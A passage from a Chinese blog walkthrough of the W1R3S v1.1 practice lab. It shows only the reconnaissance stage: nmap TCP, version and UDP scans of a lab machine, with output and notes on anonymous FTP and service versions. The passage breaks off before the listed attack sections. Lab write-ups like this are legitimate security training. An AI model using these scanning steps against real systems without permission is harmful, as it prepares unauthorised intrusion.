<!doctype html><html lang=zh-CN>
<head prefix="og: http://ogp.me/ns# article: http://ogp.me/ns/article#">
<meta charset=UTF-8>
<meta name=generator content="Hugo 0.126.1"><meta name=theme-color content="#fff">
<meta name=color-scheme content="light dark">
<meta name=viewport content="width=device-width,initial-scale=1">
<meta name=format-detection content="telephone=no, date=no, address=no, email=no">
<meta http-equiv=Cache-Control content="no-transform">
<meta http-equiv=Cache-Control content="no-siteapp">
<title>靶场思路演练之w1r3s-v1.1 | Pear</title>
<link rel=stylesheet href=/css/meme.min.e7849369b80372d813d9235d2e4703a3536a16de72dd494f1c241b2cd67a99b0.css>
<script src=/js/meme.min.93caf51ca41a6ed5e468d2ac73c7cdfe253a756a2192255cf28aaa8da5ea4209.js></script>
<link rel=preconnect href=https://fonts.gstatic.com crossorigin>
<link rel=stylesheet href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@400;500;700&amp;family=Source+Code+Pro:ital,wght@0,400;0,700;1,400;1,700&amp;family=Lexend+Giga:wght@400;500;700&amp;family=Noto+Sans+SC:wght@400;500;700&amp;family=Noto+Sans:ital,wght@0,400;0,700;1,400;1,700&amp;family=Noto+Serif:ital,wght@0,400;0,700;1,400;1,700&amp;family=Playfair+Display+SC:ital,wght@0,400;0,700;0,900;1,400;1,700;1,900&amp;family=Amiri:ital,wght@0,400;0,700;1,400;1,700&amp;family=Roboto+Mono:ital,wght@0,100;0,300;0,400;0,500;0,700;1,100;1,300;1,400;1,500;1,700&amp;family=Roboto:ital,wght@0,100;0,300;0,400;0,500;0,700;0,900;1,100;1,300;1,400;1,500;1,700;1,900&amp;family=Tinos:ital,wght@0,400;0,700;1,400;1,700&amp;display=swap" media=print onload='this.media="all"'>
<noscript><link rel=stylesheet href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@400;500;700&amp;family=Source+Code+Pro:ital,wght@0,400;0,700;1,400;1,700&amp;family=Lexend+Giga:wght@400;500;700&amp;family=Noto+Sans+SC:wght@400;500;700&amp;family=Noto+Sans:ital,wght@0,400;0,700;1,400;1,700&amp;family=Noto+Serif:ital,wght@0,400;0,700;1,400;1,700&amp;family=Playfair+Display+SC:ital,wght@0,400;0,700;0,900;1,400;1,700;1,900&amp;family=Amiri:ital,wght@0,400;0,700;1,400;1,700&amp;family=Roboto+Mono:ital,wght@0,100;0,300;0,400;0,500;0,700;1,100;1,300;1,400;1,500;1,700&amp;family=Roboto:ital,wght@0,100;0,300;0,400;0,500;0,700;0,900;1,100;1,300;1,400;1,500;1,700;1,900&amp;family=Tinos:ital,wght@0,400;0,700;1,400;1,700&amp;display=swap"></noscript>
<meta name=author content><meta name=description content="nmap 扫描 TCP 扫描 1 2 3 4 5 6 7 8 9 10 11 12 13 14 $ sudo nmap -sT --min-rate 10000 -p- 10.10.10.130 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-27 22:59 EDT Nmap scan report for">
<link rel="shortcut icon" href=/favicon.ico type=image/x-icon>
<link rel=mask-icon href=/icons/safari-pinned-tab.svg color=#2a6df4>
<link rel=apple-touch-icon sizes=180x180 href=/icons/apple-touch-icon.png>
<meta name=apple-mobile-web-app-capable content="yes">
<meta name=apple-mobile-web-app-title content="Pear">
<meta name=apple-mobile-web-app-status-bar-style content="black">
<meta name=mobile-web-app-capable content="yes">
<meta name=application-name content="Pear">
<meta name=msapplication-starturl content="../../">
<meta name=msapplication-TileColor content="#fff">
<meta name=msapplication-TileImage content="../../icons/mstile-150x150.png">
<link rel=manifest href=/manifest.json>
<link rel=canonical href=https://wwxiaoqi.com/tech/target-w1r3s-v1.1/>
<script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","datePublished":"2024-06-29T10:00:56+08:00","dateModified":"2025-05-12T12:02:23+08:00","url":"https://wwxiaoqi.com/tech/target-w1r3s-v1.1/","headline":"靶场思路演练之w1r3s-v1.1","description":"nmap 扫描 TCP 扫描 1 2 3 4 5 6 7 8 9 10 11 12 13 14 $ sudo nmap -sT --min-rate 10000 -p- 10.10.10.130 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-27 22:59 EDT Nmap scan report for","inLanguage":"zh-CN","articleSection":"tech","wordCount":5297,"image":["https://wwxiaoqi.com/images/w1r3s-v1.1/image-20240328113531-33npd4k.webp","https://wwxiaoqi.com/images/w1r3s-v1.1/image-20240328113650-8lhy985.webp","https://wwxiaoqi.com/images/w1r3s-v1.1/image-20240328113917-k5vbmvw.webp","https://wwxiaoqi.com/images/w1r3s-v1.1/image-20240328115319-wzwn2ao.webp","https://wwxiaoqi.com/images/w1r3s-v1.1/image-20240328115618-p723buw.webp","https://wwxiaoqi.com/images/w1r3s-v1.1/image-20240328120838-ezs7kv9.webp","https://wwxiaoqi.com/images/w1r3s-v1.1/image-20240328214317-z8znh5n.webp"],"author":{"@type":"Person","url":"https://wwxiaoqi.com/"},"license":"[萌 ICP 备 20225299 号](https://icp.gov.moe/?keyword=20225299) | [CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)","publisher":{"@type":"Organization","name":"Pear","logo":{"@type":"ImageObject","url":"https://wwxiaoqi.com/icons/apple-touch-icon.png"},"url":"https://wwxiaoqi.com/"},"mainEntityOfPage":{"@type":"WebSite","@id":"https://wwxiaoqi.com/"}}</script>
<meta name=twitter:card content="summary_large_image">
<meta property="og:title" content="靶场思路演练之w1r3s-v1.1">
<meta property="og:description" content="nmap 扫描 TCP 扫描 1 2 3 4 5 6 7 8 9 10 11 12 13 14 $ sudo nmap -sT --min-rate 10000 -p- 10.10.10.130 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-27 22:59 EDT Nmap scan report for">
<meta property="og:url" content="https://wwxiaoqi.com/tech/target-w1r3s-v1.1/">
<meta property="og:site_name" content="Pear">
<meta property="og:locale" content="zh-cn"><meta property="og:image" content="https://wwxiaoqi.com/images/w1r3s-v1.1/image-20240328113531-33npd4k.webp">
<meta property="og:type" content="article">
<meta property="article:published_time" content="2024-06-29T10:00:56+08:00">
<meta property="article:modified_time" content="2025-05-12T12:02:23+08:00">
<meta property="article:section" content="tech">
</head>
<body>
<div class=container>
<header class=header>
<div class=header-wrapper>
<div class="header-inner single">
<div class=site-brand>
<a href=/ class=brand>Pear</a>
</div>
<nav class=nav>
<ul class=menu id=menu>
<li class=menu-item><a href=/tech/><span class=menu-item-name>技术</span></a>
</li>
<li class=menu-item><a href=/life/><span class=menu-item-name>生活</span></a>
</li>
<li class=menu-item><a href=/about/><span class=menu-item-name>关于</span></a>
</li>
<li class=menu-item>
<a id=theme-switcher href=#><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon theme-icon-light"><path d="M193.2 104.5 242 7a18 18 0 0128 0l48.8 97.5L422.2 70A18 18 0 01442 89.8l-34.5 103.4L505 242a18 18 0 010 28l-97.5 48.8L442 422.2A18 18 0 01422.2 442l-103.4-34.5L270 505a18 18 0 01-28 0l-48.8-97.5L89.8 442A18 18 0 0170 422.2l34.5-103.4-97.5-48.8a18 18 0 010-28l97.5-48.8L70 89.8A18 18 0 0189.8 70zM256 128a128 128 0 10.01.0M256 160a96 96 0 10.01.0"/></svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon theme-icon-dark"><path d="M27 412A256 256 0 10181 5a11.5 11.5.0 00-5 20A201.5 201.5.0 0142 399a11.5 11.5.0 00-15 13"/></svg></a>
</li>
</ul>
</nav>
</div>
</div>
<input type=checkbox id=nav-toggle aria-hidden=true>
<label for=nav-toggle class=nav-toggle></label>
<label for=nav-toggle class=nav-curtain></label>
</header>
<main class="main single" id=main>
<div class=main-inner>
<article class="content post h-entry" data-align=justify data-type=tech data-toc-num=true>
<h1 class="post-title p-name">靶场思路演练之w1r3s-v1.1</h1>
<div class=post-meta>
</div>
<nav class=contents>
<h2 id=contents class=contents-title>目录</h2><ol class=toc>
<li><a id=contents:nmap-扫描 href=#nmap-扫描>nmap 扫描</a>
<ol>
<li><a id=contents:tcp-扫描 href=#tcp-扫描>TCP 扫描</a></li>
<li><a id=contents:探测版本 href=#探测版本>探测版本</a></li>
<li><a id=contents:udp-扫描 href=#udp-扫描>UDP 扫描</a></li>
<li><a id=contents:默认脚本扫描 href=#默认脚本扫描>默认脚本扫描</a></li>
</ol>
</li>
<li><a id=contents:编排攻击方向 href=#编排攻击方向>编排攻击方向</a></li>
<li><a id=contents:ftp-渗透 href=#ftp-渗透>FTP 渗透</a></li>
<li><a id=contents:3306-mysql-渗透 href=#3306-mysql-渗透>3306 mysql 渗透</a></li>
<li><a id=contents:web-渗透 href=#web-渗透>Web 渗透</a></li>
<li><a id=contents:ssh-暴力破解 href=#ssh-暴力破解>SSH 暴力破解</a></li>
</ol>
</nav><div class="post-body e-content">
<h2 id=nmap-扫描><a href=#nmap-扫描 class=anchor-link><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96.0-59.27-59.26-59.27-155.7.0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757.0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037.0 01-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482.0 0120.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96.0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454.0 0020.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037.0 00-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639.0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href=#contents:nmap-扫描 class=headings>nmap 扫描</a></h2>
<h3 id=tcp-扫描><a href=#tcp-扫描 class=anchor-link><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96.0-59.27-59.26-59.27-155.7.0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757.0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037.0 01-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482.0 0120.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96.0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454.0 0020.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037.0 00-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639.0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href=#contents:tcp-扫描 class=headings>TCP 扫描</a></h3>
<div class=highlight><div class=chroma>
<div class=table-container><table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ sudo nmap -sT --min-rate <span class=m>10000</span> -p- 10.10.10.130
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Starting Nmap 7.94SVN <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2024-03-27 22:59 EDT
</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.10.10.130
</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.00059s latency<span class=o>)</span>.
</span></span><span class=line><span class=cl>Not shown: <span class=m>55528</span> filtered tcp ports <span class=o>(</span>no-response<span class=o>)</span>, <span class=m>10003</span> closed tcp ports <span class=o>(</span>conn-refused<span class=o>)</span>
</span></span><span class=line><span class=cl>PORT     STATE SERVICE
</span></span><span class=line><span class=cl>21/tcp   open  ftp
</span></span><span class=line><span class=cl>22/tcp   open  ssh
</span></span><span class=line><span class=cl>80/tcp   open  http
</span></span><span class=line><span class=cl>3306/tcp open  mysql
</span></span><span class=line><span class=cl>MAC Address: 00:0C:29:B8:7B:3D <span class=o>(</span>VMware<span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Nmap <span class=k>done</span>: <span class=m>1</span> IP address <span class=o>(</span><span class=m>1</span> host up<span class=o>)</span> scanned in 12.50 seconds
</span></span></code></pre></td></tr></table></div>
</div>
</div><p>当前有 <code>21,22,80,3306</code> 四个端口。</p>
<p>‍</p>
<h3 id=探测版本><a href=#探测版本 class=anchor-link><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96.0-59.27-59.26-59.27-155.7.0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757.0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037.0 01-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482.0 0120.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96.0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454.0 0020.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037.0 00-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639.0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href=#contents:探测版本 class=headings>探测版本</a></h3>
<div class=highlight><div class=chroma>
<div class=table-container><table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ sudo nmap -sT -sV -sC -O -p21,22,80,3306 10.10.10.130
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Starting Nmap 7.94SVN <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2024-03-27 23:00 EDT
</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.10.10.130
</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.00041s latency<span class=o>)</span>.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>PORT     STATE SERVICE VERSION
</span></span><span class=line><span class=cl>21/tcp   open  ftp     vsftpd 2.0.8 or later
</span></span><span class=line><span class=cl><span class=p>|</span> ftp-anon: Anonymous FTP login allowed <span class=o>(</span>FTP code 230<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span> drwxr-xr-x    <span class=m>2</span> ftp      ftp          <span class=m>4096</span> Jan <span class=m>23</span>  <span class=m>2018</span> content
</span></span><span class=line><span class=cl><span class=p>|</span> drwxr-xr-x    <span class=m>2</span> ftp      ftp          <span class=m>4096</span> Jan <span class=m>23</span>  <span class=m>2018</span> docs
</span></span><span class=line><span class=cl><span class=p>|</span>_drwxr-xr-x    <span class=m>2</span> ftp      ftp          <span class=m>4096</span> Jan <span class=m>28</span>  <span class=m>2018</span> new-employees
</span></span><span class=line><span class=cl><span class=p>|</span> ftp-syst: 
</span></span><span class=line><span class=cl><span class=p>|</span>   STAT: 
</span></span><span class=line><span class=cl><span class=p>|</span> FTP server status:
</span></span><span class=line><span class=cl><span class=p>|</span>      Connected to ::ffff:10.10.10.128
</span></span><span class=line><span class=cl><span class=p>|</span>      Logged in as ftp
</span></span><span class=line><span class=cl><span class=p>|</span>      TYPE: ASCII
</span></span><span class=line><span class=cl><span class=p>|</span>      No session bandwidth limit
</span></span><span class=line><span class=cl><span class=p>|</span>      Session timeout in seconds is <span class=m>300</span>
</span></span><span class=line><span class=cl><span class=p>|</span>      Control connection is plain text
</span></span><span class=line><span class=cl><span class=p>|</span>      Data connections will be plain text
</span></span><span class=line><span class=cl><span class=p>|</span>      At session startup, client count was <span class=m>2</span>
</span></span><span class=line><span class=cl><span class=p>|</span>      vsFTPd 3.0.3 - secure, fast, stable
</span></span><span class=line><span class=cl><span class=p>|</span>_End of status
</span></span><span class=line><span class=cl>22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 <span class=o>(</span>Ubuntu Linux<span class=p>;</span> protocol 2.0<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span> ssh-hostkey: 
</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>2048</span> 07:e3:5a:5c:c8:18:65:b0:5f:6e:f7:75:c7:7e:11:e0 <span class=o>(</span>RSA<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>256</span> 03:ab:9a:ed:0c:9b:32:26:44:13:ad:b0:b0:96:c3:1e <span class=o>(</span>ECDSA<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_  <span class=m>256</span> 3d:6d:d2:4b:46:e8:c9:a3:49:e0:93:56:22:2e:e3:54 <span class=o>(</span>ED25519<span class=o>)</span>
</span></span><span class=line><span class=cl>80/tcp   open  http    Apache httpd 2.4.18 <span class=o>((</span>Ubuntu<span class=o>))</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_http-title: Apache2 Ubuntu Default Page: It works
</span></span><span class=line><span class=cl><span class=p>|</span>_http-server-header: Apache/2.4.18 <span class=o>(</span>Ubuntu<span class=o>)</span>
</span></span><span class=line><span class=cl>3306/tcp open  mysql   MySQL <span class=o>(</span>unauthorized<span class=o>)</span>
</span></span><span class=line><span class=cl>MAC Address: 00:0C:29:B8:7B:3D <span class=o>(</span>VMware<span class=o>)</span>
</span></span><span class=line><span class=cl>Warning: OSScan results may be unreliable because we could not find at least <span class=m>1</span> open and <span class=m>1</span> closed port
</span></span><span class=line><span class=cl>Aggressive OS guesses: Linux 3.10 - 4.11 <span class=o>(</span>97%<span class=o>)</span>, Linux 3.2 - 4.9 <span class=o>(</span>97%<span class=o>)</span>, Linux 5.1 <span class=o>(</span>95%<span class=o>)</span>, Linux 4.10 <span class=o>(</span>93%<span class=o>)</span>, Linux 3.4 - 3.10 <span class=o>(</span>93%<span class=o>)</span>, Linux 3.10 <span class=o>(</span>93%<span class=o>)</span>, Linux 3.13 - 3.16 <span class=o>(</span>92%<span class=o>)</span>, Linux 4.4 <span class=o>(</span>92%<span class=o>)</span>, Synology DiskStation Manager 5.2-5644 <span class=o>(</span>92%<span class=o>)</span>, Linux 3.18 <span class=o>(</span>92%<span class=o>)</span>
</span></span><span class=line><span class=cl>No exact OS matches <span class=k>for</span> host <span class=o>(</span><span class=nb>test</span> conditions non-ideal<span class=o>)</span>.
</span></span><span class=line><span class=cl>Network Distance: <span class=m>1</span> hop
</span></span><span class=line><span class=cl>Service Info: Host: W1R3S.inc<span class=p>;</span> OS: Linux<span class=p>;</span> CPE: cpe:/o:linux:linux_kernel
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class=line><span class=cl>Nmap <span class=k>done</span>: <span class=m>1</span> IP address <span class=o>(</span><span class=m>1</span> host up<span class=o>)</span> scanned in 20.74 seconds
</span></span></code></pre></td></tr></table></div>
</div>
</div><p><code>21</code> 端口是 <code>FTP</code> 的 <a href=https://zh.wikipedia.org/wiki/Vsftpd target=_blank rel=noopener>vsftpd 驻留程序</a>，存在 <code>Anonymous</code> 权限访问。</p>
<p><code>22</code> 端口是 <code>OpenSSH</code> 的 <code>7.2p2</code> 版本 <code>Ubuntu Linux</code> 操作系统。</p>
<p><code>80</code> 端口是 <code>Apache</code> 的 <code>httpd</code> 驻留程序，版本是 <code>2.4.18</code>。</p>
<p><code>3306</code> 端口是 <code>MySQL</code>。</p>
<p>‍</p>
<h3 id=udp-扫描><a href=#udp-扫描 class=anchor-link><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96.0-59.27-59.26-59.27-155.7.0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757.0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037.0 01-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482.0 0120.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96.0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454.0 0020.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037.0 00-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639.0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href=#contents:udp-扫描 class=headings>UDP 扫描</a></h3>
<div class=highlight><div class=chroma>
<div class=table-container><table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ sudo nmap -sU --top-ports <span class=m>20</span> 10.10.10.130
</span></span><span class=line><span class=cl>          
</span></span><span class=line><span class=cl>Starting Nmap 7.94SVN <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2024-03-27 23:02 EDT
</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.10.10.130
</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.00030s latency<span class=o>)</span>.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>PORT      STATE         SERVICE
</span></span><span class=line><span class=cl>53/udp    open<span class=p>|</span>filtered domain
</span></span><span class=line><span class=cl>67/udp    open<span class=p>|</span>filtered dhcps
</span></span><span class=line><span class=cl>68/udp    open<span class=p>|</span>filtered dhcpc
</span></span><span class=line><span class=cl>69/udp    open<span class=p>|</span>filtered tftp
</span></span><span class=line><span class=cl>123/udp   open<span class=p>|</span>filtered ntp
</span></span><span class=line><span class=cl>135/udp   open<span class=p>|</span>filtered msrpc
</span></span><span class=line><span class=cl>137/udp   open<span class=p>|</span>filtered netbios-ns
</span></span><span class=line><span class=cl>138/udp   open<span class=p>|</span>filtered netbios-dgm
</span></span><span class=line><span class=cl>139/udp   open<span class=p>|</span>filtered netbios-ssn
</span></span><span class=line><span class=cl>161/udp   open<span class=p>|</span>filtered snmp
</span></span><span class=line><span class=cl>162/udp   open<span class=p>|</span>filtered snmptrap
</span></span><span class=line><span class=cl>445/udp   open<span class=p>|</span>filtered microsoft-ds
</span></span><span class=line><span class=cl>500/udp   open<span class=p>|</span>filtered isakmp
</span></span><span class=line><span class=cl>514/udp   open<span class=p>|</span>filtered syslog
</span></span><span class=line><span class=cl>520/udp   open<span class=p>|</span>filtered route
</span></span><span class=line><span class=cl>631/udp   open<span class=p>|</span>filtered ipp
</span></span><span class=line><span class=cl>1434/udp  open<span class=p>|</span>filtered ms-sql-m
</span></span><span class=line><span class=cl>1900/udp  open<span class=p>|</span>filtered upnp
</span></span><span class=line><span class=cl>4500/udp  open<span class=p>|</span>filtered nat-t-ike
</span></span><span class=line><span class=cl>49152/udp open<span class=p>|</span>filtered unknown
</span></span><span class=line><span class=cl>MAC Address: 00:0C:29:B8:7B:3D <span class=o>(</span>VMware<span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Nmap <span class=k>done</span>: <span class=m>1</span> IP address <span class=o>(</span><span class=m>1</span> host up<span class=o>)</span> scanned in 1.75 seconds
</span></span></code></pre></td></tr></table></div>
</div>
</div><p>都是 <code>open|filtered</code> 状态，没什么发现。</p>
<p>‍</p>
<h3 id=默认脚本扫描><a href=#默认脚本扫描 class=anchor-link><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96.0-59.27-59.26-59.27-155.7.0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757.0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037.0 01-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482.0 0120.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96.0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454.0 0020.521 17.196c6.402 4.468 15.064 3.789 